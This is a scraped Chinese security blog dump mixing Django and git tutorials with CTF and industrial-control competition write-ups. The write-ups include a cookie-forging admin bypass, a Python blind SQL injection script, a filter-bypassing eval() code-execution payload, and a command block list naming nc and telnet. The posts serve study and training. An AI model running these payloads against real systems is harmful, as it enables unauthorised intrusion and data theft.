`Model_study_article`.`id` = 1; args=(1,) &gt;&gt;&gt; 5.其他常见的操作可以搜索相关的资料 结束语本篇中我们主要学习models中对象中的相关操作，常用的数据操作，熟练掌握，后面会对我们实际项目开发中事半功倍，然后介绍Django的ORM怎么操作一对一、一对多、多对多的操作。","categories":[{"name":"Django","slug":"Django","permalink":"https://www.xjseck.com/categories/Django/"}],"tags":[{"name":"Django","slug":"Django","permalink":"https://www.xjseck.com/tags/Django/"}]},{"title":"Django学习笔记(二)","slug":"Django学习笔记-二","date":"2018-01-27T16:23:40.000Z","updated":"2018-07-15T16:30:53.291Z","comments":true,"path":"2018/01/28/Django学习笔记-二/","link":"","permalink":"https://www.xjseck.com/2018/01/28/Django学习笔记-二/","excerpt":"","text":"前言学习最快的办法就是动手实践。 通过上一个笔记的学习，我们应该能学习到了内容如下 能使用 Django创建 项目和一些参数的说明 能清楚Django默认创建项目的文件目录结构 通过本笔记的学习我们可以学习到的知识点如下 默认创建的Django配置解读 创建app 实例一个MVT 实例从上一个笔记到这个笔记的过度，需要动手操作才能很好的掌握。Django版本1.8.5实例（二） 默认的配置文件了解Django相关的配置都在settings.py文件中123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596# Build paths inside the project like this: os.path.join(BASE_DIR, ...)import osBASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))# Quick-start development settings - unsuitable for production# See https://docs.djangoproject.com/en/1.8/howto/deployment/checklist/# SECURITY WARNING: keep the secret key used in production secret!SECRET_KEY = &apos;abmu19wmz5#1qwmfc_wagpf_vh+8faqs8=#xi=mik1+4*9b*dv&apos;# SECURITY WARNING: don&apos;t run with debug turned on in production!DEBUG = False #进行调试模式 True为开启# If this flag set to False, then user can&apos;t register account.IS_REGISTER_PERIOD = TrueALLOWED_HOSTS = [&apos;127.0.0.1&apos;]# Application definition 创建的app应用定义到这里INSTALLED_APPS = ( &apos;django.contrib.admin&apos;, #管理员站点 &apos;django.contrib.auth&apos;,#用户验证框架 &apos;django.contrib.contenttypes&apos;,#文件类型框架 &apos;django.contrib.sessions&apos;,#会话框架 &apos;django.contrib.messages&apos;,#消息框架 &apos;django.contrib.staticfiles&apos;,#静态资源管理框架 &apos;account&apos;, #激活应用 &apos;home&apos;, &apos;dashboard&apos;, &apos;gameboard&apos;, &apos;noticeboard&apos;,)&quot;&quot;&quot;中间件，介于request 和 response处理之间的一道处理过程，相对比较轻量级，并且在全局上改变，django的输入与输出，因为改变的是全局所以需要谨慎使用，用不好会影响性能，每一个中间件都会负责一个功能，例如AuthentictionMiddleware和session处理相关，&quot;&quot;&quot;MIDDLEWARE_CLASSES = ( &apos;django.contrib.sessions.middleware.SessionMiddleware&apos;, &apos;django.middleware.common.CommonMiddleware&apos;, &apos;django.middleware.csrf.CsrfViewMiddleware&apos;, &apos;django.contrib.auth.middleware.AuthenticationMiddleware&apos;, &apos;django.contrib.auth.middleware.SessionAuthenticationMiddleware&apos;, &apos;django.contrib.messages.middleware.MessageMiddleware&apos;, &apos;django.middleware.clickjacking.XFrameOptionsMiddleware&apos;, &apos;django.middleware.security.SecurityMiddleware&apos;,)ROOT_URLCONF = &apos;hexactf.urls&apos;#这个变量的值就是根URLconf的模块名，默认是urls.py 文件的模块名TEMPLATES = [ &#123; &apos;BACKEND&apos;: &apos;django.template.backends.django.DjangoTemplates&apos;, &apos;DIRS&apos;: [os.path.join(BASE_DIR, &quot;static&quot;, &quot;templates&quot;)], #指定模板文件目录 &apos;APP_DIRS&apos;: True, &apos;OPTIONS&apos;: &#123; &apos;context_processors&apos;: [ &apos;django.template.context_processors.debug&apos;, &apos;django.template.context_processors.request&apos;, &apos;django.contrib.auth.context_processors.auth&apos;, &apos;django.contrib.messages.context_processors.messages&apos;, ], &#125;, &#125;,]WSGI_APPLICATION = &apos;hexactf.wsgi.application&apos;# Database# https://docs.djangoproject.com/en/1.8/ref/settings/#databases&apos;&apos;&apos;DATABASES = &#123; &apos;default&apos;: &#123; &apos;ENGINE&apos;: &apos;django.db.backends.sqlite3&apos;, &apos;NAME&apos;: os.path.join(BASE_DIR, &apos;db.sqlite3&apos;), &#125;&#125;&apos;&apos;&apos;DATABASES = &#123; &apos;default&apos;: &#123; &apos;ENGINE&apos;: &apos;django.db.backends.mysql&apos;, #数据库引擎 &apos;NAME&apos;: &apos;database_name&apos;, &apos;USER&apos;: &apos;mysql_id&apos;, &apos;PASSWORD&apos;: &apos;mysql_passwd&apos;, &apos;HOST&apos;: &apos;localhost&apos;, &apos;PORT&apos;: &apos;&apos;, &#125;&#125;# Internationalization# https://docs.djangoproject.com/en/1.8/topics/i18n/LANGUAGE_CODE = &apos;ko-kr&apos; #语言TIME_ZONE = &apos;Asia/Seoul&apos; #时区USE_I18N = True #语言USE_L10N = True #数据和时间格式USE_TZ = False #是否启用时区# Static files (CSS, JavaScript, Images)# https://docs.djangoproject.com/en/1.8/howto/static-files/STATIC_URL = &apos;/static/&apos;LOGIN_URL = &apos;/account/sign_in/&apos;LOGOUT_URL = &apos;/account/sign_out/&apos;MEDIA_ROOT = os.path.join(BASE_DIR, &apos;static&apos;)MEDIA_URL = &apos;/media/&apos;if DEBUG: STATIC_ROOT = os.path.join(BASE_DIR, &apos;/static&apos;, &apos;static&apos;)else: STATIC_ROOT = os.path.join(BASE_DIR, &apos;static&apos;, &apos;static&apos;)STATICFILES_DIRS = os.path.join(BASE_DIR, &quot;static&quot;, &quot;static&quot;), 创建app $python manage startapp blog编写一个MVT 例子的层级目录如下首先我们创建好了blog app 添加到settings.py 中123456789INSTALLED_APPS = ( &apos;django.contrib.admin&apos;, &apos;django.contrib.auth&apos;, &apos;django.contrib.contenttypes&apos;, &apos;django.contrib.sessions&apos;, &apos;django.contrib.messages&apos;, &apos;django.contrib.staticfiles&apos;, &apos;blog&apos;,) 本例子中涉及到model中的相关内容在model.py中，model.py中的代码如下12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061#coding:utf-8from django.db import modelsfrom django.contrib.auth.models import User# Create your models here.# 创建数据库表#step1：类名就是数据库中的表名，要继承modelsclass Category(models.Model): &quot;&quot;&quot; Django 要求模型必须继承 models.Model 类。 Category 只需要一个简单的分类名 name 就可以了。 CharField 指定了分类名 name 的数据类型，CharField 是字符型， CharField 的 max_length 参数指定其最大长度，超过这个长度的分类名就不能被存入数据库。 当然 Django 还为我们提供了多种其它的数据类型，如日期时间类型 DateTimeField、整数类型 IntegerField 等等。 Django 内置的全部类型可查看文档： https://docs.djangoproject.com/en/1.10/ref/models/fields/#field-types &quot;&quot;&quot; name = models.CharField(max_length=100) #python3 使用str 把对象以字符串形式显示 shell模式下all()函数可以显示数据 #python2.7 使用unicode def __unicode__(self): return self.name # def __str__(self): # return self.nameclass Tag(models.Model): &quot;&quot;&quot; 标签 Tag 也比较简单，和 Category 一样。 再次强调一定要继承 models.Model 类！ &quot;&quot;&quot; name = models.CharField(max_length=100) def __unicode__(self): return self.name # def __str__(self): # return self.nameclass New(models.Model): # 文章标题 title = models.CharField(max_length=70) # 文章正文，我们使用了 TextField。 # 存储比较短的字符串可以使用 CharField，但对于文章的正文来说可能会是一大段文本，因此使用 TextField 来存储大段文本。 body = models.TextField() # 这两个列分别表示文章的创建时间和最后一次修改时间，存储时间的字段用 DateTimeField 类型。 created_time = models.DateTimeField() modified_time = models.DateTimeField() # 文章摘要，可以没有文章摘要，但默认情况下 CharField 要求我们必须存入数据，否则就会报错。 # 指定 CharField 的 blank=True 参数值后就可以允许空值了。 excerpt = models.CharField(max_length=200, blank=True) # 这是分类与标签，分类与标签的模型我们已经定义在上面。 # 我们在这里把文章对应的数据库表和分类、标签对应的数据库表关联了起来，但是关联形式稍微有点不同。 # 我们规定一篇文章只能对应一个分类，但是一个分类下可以有多篇文章，所以我们使用的是 ForeignKey，即一对多的关联关系。 # 而对于标签来说，一篇文章可以有多个标签，同一个标签下也可能有多篇文章，所以我们使用 ManyToManyField，表明这是多对多的关联关系。 # 同时我们规定文章可以没有标签，因此为标签 tags 指定了 blank=True。 # 如果你对 ForeignKey、ManyToManyField 不了解，请看教程中的解释，亦可参考官方文档： # https://docs.djangoproject.com/en/1.10/topics/db/models/#relationships category = models.ForeignKey(Category) tags = models.ManyToManyField(Tag, blank=True) # 文章作者，这里 User 是从 django.contrib.auth.models 导入的。 # django.contrib.auth 是 Django 内置的应用，专门用于处理网站用户的注册、登录等流程，User 是 Django 为我们已经写好的用户模型。+ # 这里我们通过 ForeignKey 把文章和 User 关联了起来。 # 因为我们规定一篇文章只能有一个作者，而一个作者可能会写多篇文章，因此这是一对多的关联关系，和 Category 类似。 author = models.ForeignKey(User) def __unicode__(self): return self.title 在settings.py中查看数据库的配置信息，创建数据库准备工作完成之后我们需要执行12$python manage.py makemigrations$python manage.py migrate 所以我们直接在blog目录下的views.py中编写代码12345678910111213141516171819202122#coding:utf-8from django.shortcuts import renderfrom models import Newfrom django.http import HttpResponsefrom forms import AddForm# Create your views here.#直接使用Views 把数据推送到Template中进行浏览器显示def index(request): return HttpResponse(&apos;欢迎来到博客首页！&lt;a href=&quot;/show&quot;&gt;show&lt;/a&gt; &lt;a href=&quot;/add&quot;&gt;add&lt;/a&gt;&apos;)def show(request): new_list=New.objects.all() return render(request,&apos;blog/show.html&apos;,&#123;&apos;new_list&apos;:new_list&#125;)def add(request): if request.method == &apos;POST&apos;: form = AddForm(request.POST) if form.is_valid(): a=form.cleaned_data[&apos;a&apos;] b=form.cleaned_data[&apos;b&apos;] return HttpResponse(str(int(a)+int(b))) else: form=AddForm() return render(request,&apos;blog/add.html&apos;,&#123;&apos;form&apos;:form&#125;) 代码的说明之后的内容会详细讲到，目前是先这样了解用着。有了Views中的内容之后，我们怎样把它推送给客户浏览器上进行显示。之后我们需要在blog目录下的urls.py中进行设置1234567from django.conf.urls import urlfrom . import viewsurlpatterns=[ url(r&apos;^$&apos;,views.index,name=&apos;index&apos;), url(r&apos;^show/$&apos;,views.show), url(r&apos;^add/$&apos;,views.add),] 我们来创建templates这里我们有两种的创建方式，一种是统一在项目的根目录下创建一个templates文件然后里面创建app的名字文件夹本例子中使用的就是这一种，还有一种就是在app blog目录下创建templates文件夹，只是在变代码的时候模板文件路径略有不同而已。模板文件的代码show.html 12345678910111213141516171819202122232425&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;Title&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;table border=&quot;1xp&quot;&gt; &lt;thead&gt; &lt;tr&gt; &lt;th&gt;标题&lt;/th&gt; &lt;th&gt;内容&lt;/th&gt; &lt;/tr&gt; &lt;/thead&gt; &lt;tbody&gt; &#123;% for line in new_list %&#125; &lt;tr&gt; &lt;td&gt;&#123;&#123; line.title &#125;&#125;&lt;/td&gt; &lt;td&gt;&#123;&#123; line.body &#125;&#125;&lt;/td&gt; &lt;/tr&gt; &#123;% endfor %&#125; &lt;/tbody&gt;&lt;/table&gt;&lt;/body&gt;&lt;/html&gt; add.html如下1234567891011121314&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;Title&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;form method=&quot;post&quot;&gt; &#123;% csrf_token %&#125; &#123;&#123; form&#125;&#125; &lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt; 需要使Django找打模板文件的路径还需要在settings.py中设置DIRS123456789101112131415TEMPLATES = [ &#123; &apos;BACKEND&apos;: &apos;django.template.backends.django.DjangoTemplates&apos;, &apos;DIRS&apos;: [os.path.join(BASE_DIR, &apos;templates&apos;)], &apos;APP_DIRS&apos;: True, &apos;OPTIONS&apos;: &#123; &apos;context_processors&apos;: [ &apos;django.template.context_processors.debug&apos;, &apos;django.template.context_processors.request&apos;, &apos;django.contrib.auth.context_processors.auth&apos;, &apos;django.contrib.messages.context_processors.messages&apos;, ], &#125;, &#125;,] 最后实现了一个简单的mvt模式，但是之中的内容还需要私下底查一些相关的资料，进行详细的学习。 结束语本篇的学习，我们了解了Django的MVT模式，本篇的内容还得学习一些Django 中相关操作。代码上传到了github了https://github.com/Huseck/Django-study/tree/Django-study-2 下载配置的问题需要把blog目录下migrations目录下的 inital.py之类的文件删除然后数据迁移123$python manage.py makemigrations $python manage.py migrate$python manage.py runserver 如以下的相关知识点 Django 处理Form表单的操作 url正则的知识点 模板代码 操作 Django 怎么处理url参数的传递的","categories":[{"name":"Django","slug":"Django","permalink":"https://www.xjseck.com/categories/Django/"}],"tags":[{"name":"Django","slug":"Django","permalink":"https://www.xjseck.com/tags/Django/"}]},{"title":"Django 学习笔记(一)","slug":"Django-学习笔记-一","date":"2018-01-25T16:18:08.000Z","updated":"2018-07-15T16:22:15.113Z","comments":true,"path":"2018/01/26/Django-学习笔记-一/","link":"","permalink":"https://www.xjseck.com/2018/01/26/Django-学习笔记-一/","excerpt":"","text":"前言1.2018年了，计划一下学习任务。 深入学习Python学习Django 或者Flask 框架进行Web项目的开发深入学习PHP相关的黑科技和代码审计渗透测试流程和技巧总结社团相关的运营 先学习Django学习Django MVT 开发模式，主要学习Django的配置说明和app应用之间的耦合进行项目的组合。进行快速的web项目开发。 基础知识点学习 前端相关知识点（html css js form表单）学习 Python的一些基础语法点学习 Linux 基础操作和命令学习 数据库的相关操作学习 HTTP协议的一些参数学习 COOKIES SESSION 判断状态和权限参考http://python.usyiyi.cn/translate/django_182/index.html https://code.ziqiangxuetang.com/django/django-registration.html Django版本的一些特点版本之间的改动，基本操作和相关的一些配置说明。 例子快速的掌握Django就是拿例子说明，先明白在Django框架下的相关操作的规则之后，在回过头来明白实现的机理。例子（一）环境window10 Python2.7 1.先配置本机的Python隔离环境 $pip install virtualenv2.建立Django项目 $pip install django 本地环境变量设置一下 C:\\Python27\\Lib\\site-packages\\django\\bin 然后创建项目(相关的参数可以-h显示) $django-admin startproject django-project 启动项目 $python manage.py 8080 浏览器输入地址显示hello world 结束语从例子中先看看Django 默认创建项目的文件列表和代码中相关的配置","categories":[{"name":"Django","slug":"Django","permalink":"https://www.xjseck.com/categories/Django/"}],"tags":[{"name":"Django","slug":"Django","permalink":"https://www.xjseck.com/tags/Django/"}]},{"title":"帮人代打的比赛","slug":"帮人代打的比赛","date":"2017-12-28T15:43:41.000Z","updated":"2018-07-15T16:03:45.106Z","comments":true,"path":"2017/12/28/帮人代打的比赛/","link":"","permalink":"https://www.xjseck.com/2017/12/28/帮人代打的比赛/","excerpt":"","text":"前言好久没有更新博客了，这一段时间自己也比较懒，主要还是进行了两次比赛吧，东奔西跑的。也很难让自己沉淀下来。就简单的总结一下比赛的过程，然后发现自己的不足。 关于比赛CNAS T0832网络安全等级保护测评能力验证与攻防大赛2017年中关村信息安全测评联盟测评能力验证与攻防大赛2017年工业信息安全技能大赛一场比赛,一场懵逼，一场比赛，一场菜。首先说一下第一场比赛感觉和解题过程。比赛是在北京双十一当天的下午。进行WEB解题，从技术支撑I春秋就能发现，类似CTF-WEB题，共十道题，难度又长又短吧。比赛当时队伍中也是我一个人在解题，时间上肯定是不够用的。题目一(身份鉴别)直接信息收集 robots.txt获得后台登录界面，然后bp抓包，也该源代码中有提示admin/admin登录成功getflag 题目二(安全审计)题目提示是有小黑攻入web服务，放置了app留有后门，通过扫描之后发现access.log和error.log日志文件里面有apk 的地址，下载app进行逆向分析，当时是使用的dex2jar+jd-gui进行反编译的，出现了问题，事后复现了一下，使用jeb这个或者android_kill进行反编译比较方便一些。12345678910111213141516public class MainActivity extends AppCompatActivity &#123; public MainActivity() &#123; super(); &#125; protected void onCreate(Bundle arg6) &#123; int v3 = 56; int[] v0 = new int[]&#123;150, 161, 180, 164, 150, 255, 191, 248, 130, 152, 142, 161, 129, 136, 137, 255, 129, 165, 252, 187, 130, 152, 153, 180, 128, 152, 157, 187, 130, 166, 137, 184, 149, 161, 137, 255, 150, 165, 252, 254, 130, 152, 137, 181, 149, 166, 175, 180, 150, 136, 154, 166, 130, 166, 168, 245&#125;; int v1; for(v1 = 0; v1 &lt; v3; ++v1) &#123; v0[v1] ^= 204; &#125; new String(Base64.decode(v0.toString(), 0)); super.onCreate(arg6); this.setContentView(2130968603); &#125;&#125; 这里就很容易的发现是对204进行异或，只要再进行一次异或就能知道原来的数据Python写一个脚本 题目三(访问控制与授权) 首先抓包进行分析，cookie中有一个role参数进行base解码s:5:”guest” 所以替换成admin传入得到源代码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647&lt;?php$role = &quot;guest&quot;;$flag = &quot;flag&#123;???&#125;&quot;;$auth = false;if(isset($_COOKIE[&quot;role&quot;]))&#123; $role = unserialize(base64_decode($_COOKIE[&quot;role&quot;])); if($role === &quot;admin&quot;)&#123; $auth = true; &#125; else&#123; $auth = false; &#125;&#125;else&#123; $role = base64_encode(serialize($role)); setcookie(&apos;role&apos;,$role);&#125;if($auth)&#123; if(isset($_POST[&apos;filename&apos;]))&#123; $filename = $_POST[&apos;filename&apos;]; $data = $_POST[&apos;data&apos;]; if(preg_match(&apos;[&lt;&gt;?]&apos;, $data)) &#123; die(&apos;No No No!&apos;); &#125; else &#123; $s = implode($data); if(!preg_match(&apos;[&lt;&gt;?]&apos;, $s))&#123; $flag=&quot;None.&quot;; &#125; $rand = rand(1,10000000); $tmp=&quot;./uploads/&quot;.md5(time() + $rand).$filename; file_put_contents($tmp, $flag); echo &quot;your file is in &quot; . $tmp; &#125; &#125; else&#123; echo &quot;Hello admin, now you can upload something you are easy to forget.&quot;; echo &quot;&lt;br /&gt;there are the source.&lt;br /&gt;&quot;; echo &apos;&lt;textarea rows=&quot;10&quot; cols=&quot;100&quot;&gt;&apos;; echo htmlspecialchars(str_replace($flag,&apos;flag&#123;???&#125;&apos;,file_get_contents(__FILE__))); echo &apos;&lt;/textarea&gt;&apos;;+ &#125;&#125;else&#123; echo &quot;Sorry. You have no permissions.&quot;;&#125;?&gt; 首先是绕过data里面的值$s = implode($data); 可以看出是数组才有返回值，然后才能过if(!preg_match(‘[&lt;&gt;?]’, $s)){应为之前判断也是检测data所以数组可以绕过payload filename=1.php&amp;data[]=s &lt; das只有加上&lt;&gt;就可以 题目四(数据保密存储) 页面很简单就是一个大马的登录界面，这个题说白了就是爆破，但是想了一下组合的可能太多，事后知道是4位数组，爆破出来的话就简单了。 题目五(漏洞检测)题目提示网站存在漏洞，但是使用工具却没有发现问题所在，存在问题的参数是phone。打开题目发现是登录注册的题，一般不是存在源码就是注入或者挨个测试参数。简单的测试发现是挨个测试参数的问题，那就着重测试phone参数，最后发现是十六进制。首先注册然后登录check.php 查看此电话号码 有多少人使用，源代码中有提示 admin 的phone之后注册填入phone 用户名不能重复 phone 是数字 不能是字符，猜测0x 的二次注入麻烦的就是每次注册要使用不同的用户。 思路整理一下就可以开始撸py脚本了123456789101112131415161718192021222324252627282930313233343536373839404142434445#coding:utf-8import requestsimport randomimport string# print hex_s# database=&quot;webdb&quot;database=&quot;&quot;#pass c199055fc2c7a66eb257dd3c865398strstr=&quot;-\\&#123;0123456789abcdefghijklmnopqrstuvwxyz\\&#125;&quot;for x in range(20,50): for z in strstr: reg_url=&quot;http://172.16.5.105/register.php&quot; username=&apos;mmp&apos;+str(random.randint(9999, 10000000)) sqlstr=&quot;1 and(if((ascii(substring((select phone from user limit 0,1),%s,1))=%s),sleep(3),1))&quot; %(x,ord(z)) #sqlstr=&quot;1 and(if((ascii(substring(database(),%s,1))=%s),sleep(3),0))&quot; %(x,z) # print sqlstr hex_s=&quot;&quot; for i in sqlstr: hex_s=hex_s+hex(ord(i)).replace(&apos;0x&apos;,&apos;&apos;) r_data=&#123; &quot;username&quot;:username, &quot;password&quot;:&quot;123&quot;, &quot;phone&quot;:&quot;0x&quot;+hex_s &#125; res=requests.post(reg_url, data=r_data,timeout=20) # print username # print res.content #先注册 log_url=&quot;http://172.16.5.105/login.php&quot; log_data=&#123; &quot;username&quot;:username, &quot;password&quot;:&quot;123&quot; &#125; S=requests.session() l_res=S.post(log_url, data=log_data,timeout=20) index_url=&quot;http://172.16.5.105/index.php&quot; index_res=S.get(index_url) # print index_res.content check_url=&quot;http://172.16.5.105/check.php&quot; try: check_res=S.get(check_url,timeout=3) except Exception, e: # print sqlstr database=database+z print database 赛后把这个题目的源代码复现了一下 详细的功能可以看 github 测评文件。其他题目当时比赛就一下午的时间，一个人做时间上有点来不及，后面的题目，大概是绕waf注入的题目，没有来得及仔细分析时间就到了。 工控的比赛以前也也没有接触过工控安全，所以赛前准备了一下知识点和方法。比赛地点是在杭州的电子科技大学比赛时间19-21都是从早8:00到晚20:00前两天是PLC硬件的调试和挖掘前期准备就是尝试收集网上的挖掘方法和已知的漏洞exp，工业漏洞安全报告文档等。干货比较十足的是KCon2015 Exploit PLC on the internet.pdfKCon2015 工控系统安全威胁与应对探索.pdf漏洞体现可以从 端口、协议和服务三方面进行体现测试挖掘的方向12345678910111213141516171819202122232425262728内存溢出区内的操作不正确的限制• 不正确的输入验证• 限制目录路径名的不正确规则• 权限和访问控制• 信息曝光• 凭证管理• 验证不正确• 资源管理错误• 页面生成过程中的不正确(跨站脚本)• 数字错误SCADA网络安全防范虽然无法在部署之前了解和检测所有安全漏洞，但可以肯定的是通过采用下面纵深防御措施一定可以主动地减轻攻击者对SCADA网络造成的安全破坏：• 开发安全策略；• 实现ACL；• 使用MAC地址过滤；• 使用VLAN分段；• 加强SCADA设备物理安全，包括警报和防撬管理；• 不允许使用第三方USB及相关存储设备；• 实现支持SCADA协议防御机制的NIDS/NIPS；• 整合操作系统和固件升级（包括补丁维护）；• 实现高强度的加密功能；• 确保已经准备好二重或三重身份验证策略；• 确保计划内的内部安全评估得到如期执行；• 考虑使用工控漏扫ICSscan以及包含fuzzing测试功能的ICSscan定期对工控系统进行安全评估；• 如果可能的话，使用诸如SSH、DNPsec、TLS、DTLS、SSL、PKI和IPsec之类的保护性协议；• 如果使用的是拨号调制解调器，那么实现支持活动日志、加密、名字和口令身份验证的增强型安全措施；• 实现一套SIEM安全信息和事件管理系统来完成日志聚合、日志审查和审计分析；• 为所有合适的防火墙、交换机、路由器、NIPS和NIDS设备实现可扩展的边界网络策略。 第一天趟了一上午，然后就会宾馆了，主要是熟悉了一下PLC_config控制软件，进行对PLC设备调试一些执行和抓抓包分析一下。第二天发现使用AlphaFuzzer1.6 进行网络协议fuzz结果可以把plc直接跑到宕机。也算是一个漏洞吧，哈哈。然后再抓包分析，感觉PLC设备没有什么验证机制，fuzz起来还是能发现它挺脆弱的。然后写文档走人了，没有报进入决赛的希望，什么都不会，在杭电的体育馆中待着还是挺冷的。最后一点SCADA软件检测就更加蒙蔽了。应该算是草草离场了。 总结网络安全的趋势感觉要覆盖很广的领域，想要能发现问题，编程技能和基础知识就显得更加的重要了。漏洞挖掘的思路和手段就应该加强，后面学习一下fuzzing的技术和手段，希望以后能沉住气，踏踏实实的走好每一步。最后想要这两场比赛的题目和SCADA软件的可以私聊，一起交流。","categories":[{"name":"比赛","slug":"比赛","permalink":"https://www.xjseck.com/categories/比赛/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://www.xjseck.com/tags/CTF/"},{"name":"比赛","slug":"比赛","permalink":"https://www.xjseck.com/tags/比赛/"}]},{"title":"正则调试案例","slug":"正则调试案例","date":"2017-10-27T15:20:21.000Z","updated":"2018-07-15T15:43:15.284Z","comments":true,"path":"2017/10/27/正则调试案例/","link":"","permalink":"https://www.xjseck.com/2017/10/27/正则调试案例/","excerpt":"","text":"前言我们在进行正则调试的时候，首先是需要读懂正则表达式的意思，其次是进行绕过或者fuzz，后续的才能能好的绕过。正则调试工具https://regexper.com 生成图进行解读正则表达式调试前的基础PHP 我们一般用的比较多的正则判断函数preg_match()、preg_replace()、preg_filter()等函数。这里我们就介绍preg_match()函数1int preg_match ( string $pattern , string $subject [, array &amp;$matches [, int $flags = 0 [, int $offset = 0 ]]] ) 搜索 subject 与 pattern 给定的正则表达式的一个匹配 参数说明 $pattern: 要搜索的模式，字符串形式。 $subject: 输入字符串。 $matches: 如果提供了参数matches，它将被填充为搜索结果。 $matches[0]将包含完整模式匹配到的文本，如果是第一个子模式匹配到的数据也是显示在$matches[0]中;$matches[1] 将包含第一个捕获子组匹配到的文本，以此类推, print_r($matches) 显示匹配的内容。 $flags：flags 可以被设置为以下标记值： PREG_OFFSET_CAPTURE: 如果传递了这个标记，对于每一个出现的匹配返回时会附加字符串偏移量(相对于目标字符串的)。 注意：这会改变填充到matches参数的数组，使其每个元素成为一个由 第0个元素是匹配到的字符串，第1个元素是该匹配字符串 在目标字符串subject中的偏移量。 offset: 通常，搜索从目标字符串的开始位置开始。可选参数 offset 用于 指定从目标字符串的某个未知开始搜索(单位是字节) 实例一直接上代码index.php123456789101112131415161718192021222324&lt;?php/** * Created by seck. * Date: 2017/10/27 * Time: 20:39 *///index.phperror_reporting(0);include &apos;config.php&apos;;if(isset($_GET[&apos;phpinfo&apos;]))&#123; php_info();&#125;if(isset($_GET[&apos;eval&apos;]))&#123; $filter = &apos;/_|(.*)(\\&apos;|\\&quot;|\\`|\\()(.*)(\\&apos;|\\&quot;|\\`|\\))|(.php|\\=|\\$)/i&apos;; if(preg_match($filter, $_GET[&apos;eval&apos;],$matches))&#123; print_r($matches); var_dump($_GET[&apos;eval&apos;]); exit(&apos;nope&apos;); &#125; var_dump($_GET[&apos;eval&apos;]); //403 forbidden : system filter eval($_GET[&apos;eval&apos;]);&#125;highlight_file(__FILE__); config.php123456789101112131415161718&lt;?php/** * Created by seck. * Date: 2017/10/27 * Time: 20:39 */ //config.phperror_reporting(0);function php_info()&#123; exit(&apos;PHP Version 7.0.18-0ubuntu0.16.10.1&apos;);&#125;$filter = &quot;/\\||\\/|\\.\\.|config|fwrite|fputs|shutdown|halt|&quot;. &quot;reboot|init|rm|mv|cp|remove|rename|copy|grep|nc|unlink|find|&quot;. &quot;apt|yum|passwd|chmod|chown|ln|kill|lilo|ssh|telnet/i&quot;;$implode = implode($_REQUEST);if(preg_match($filter, $implode))&#123; exit(&apos;403 forbidden&apos;);&#125; 首先过config的判断比较简单 直接使用system();index.php 的正则才是关键1$filter = &apos;/_|(.*)(\\&apos;|\\&quot;|\\`|\\()(.*)(\\&apos;|\\&quot;|\\`|\\))|(.php|\\=|\\$)/i&apos;; 首先分析正则是 从大分三大块 全部是6段，可以使用?eval=.php测试显示1_ | (.*)(\\&apos;|\\&quot;|\\`|\\()(.*)(\\&apos;|\\&quot;|\\`|\\)) | (.php|\\=|\\$) 到这里我们应该知道第二大段的有3个子模式，所以在匹配时需要同时满足这三个子模式才能匹配，如果我们能同时满足这个三个子模式也就绕过了。比如$filter = &#39;/_|(a)(bb)(c)|(.php|\\=|\\$)/i&#39;;测试?eval=abbc 才能匹配最后我们想构造形如?eval=system(‘cat flag.php’); 进行读取flag文件这里我们可以使用%0a绕过 贪婪模式(是可以匹配上也可以没有匹配上)另两个模式就必须要匹配上四种中的一种 第二个大段的正则也就绕过了，但是第三个大模式.php没有绕过这里我们使用linux 的cat+ 命令查看所有的文件内容即可bp抓一下数据包最后的payload:?eval=system(%0a”%0acat+“%0a)我们分析一下怎么绕过第二段模式的 system(%0a 是绕过(.) 接着双引号满足第二个接着是(.*)我们可有可无 最后必须要满足但是运行在windows的环境下，却不能执行成功，也不知道为什么，知道表哥求py一下。","categories":[{"name":"正则","slug":"正则","permalink":"https://www.xjseck.com/categories/正则/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.xjseck.com/tags/PHP/"},{"name":"正则","slug":"正则","permalink":"https://www.xjseck.com/tags/正则/"}]},{"title":"git控制管理学习","slug":"git控制管理学习","date":"2017-10-27T15:08:31.000Z","updated":"2018-07-15T15:17:20.236Z","comments":true,"path":"2017/10/27/git控制管理学习/","link":"","permalink":"https://www.xjseck.com/2017/10/27/git控制管理学习/","excerpt":"","text":"管理github使用git配合管理github仓库首先在github上创建仓库然后就是你需要设置自己git的ssh-keys进行对自己github仓库的管理具体设置参考key-add之后就是本地创建一个git123456789101112#先创建一个文件夹和远程仓库项目的名称一样然后$ git init$ git remote add master https://github.com/Huseck/scan_kill_php_shell.git 指定远程仓库+$ git remote -v //显示一下信息$ git pull --rebase master master 获取一下readme.md 的信息$ git add . //添加本地文件$ git commit -m &quot;first push&quot; //保存一下信息$ git push -u master master // 上传//之后的每次文件的改变之后使用$ git add .$ git commit -m &quot;修改的信息&quot;$ git push 建议以后的推送使用commit 填写修改的信息比较好回滚其他经常使用到的功能git工具下载：https://git-scm.com/download/配置git信息12git config --global user.name &quot;Your name&quot;git config --global user.email &quot;Your email&quot; 1、git本地仓库初始化1234git initgit remote remove/add origin git仓库地址git pull origin master master //取远程主分支git pull origin Liang Liang //取远程Liang的分支 2、提交远程到仓库123git add .git commit -m &quot;提交信息&quot;git push origin MoLiang //提交到远程分支MoLiang 3、分支管理12git branch Liang //创建Liang的分支git branch origin/Liang //创建Liang的远程分支 4、合并主分区123git checkout master (主分支)git merge origin/MoLianggit push origin master:master //$ git push &lt;远程主机名&gt; &lt;本地分支名&gt;:&lt;远程分支名&gt; 5、回滚主分支123456789101112$git status //查看仓库状态$git diff //查看本地和远程仓库的不同$git log 查看commit的sha1值+ --pretty=oneline参数简练显示$git log -p -2 //比对一下内容//进行回滚到上一个版本时，此时的版本就会被删除，本地的文件内容就回滚到上一个版本时的内容，之后push到仓库$git reset --hard b353d4653da422aa6be61696c5c6379bffd7bfc5$git push -f -u master master 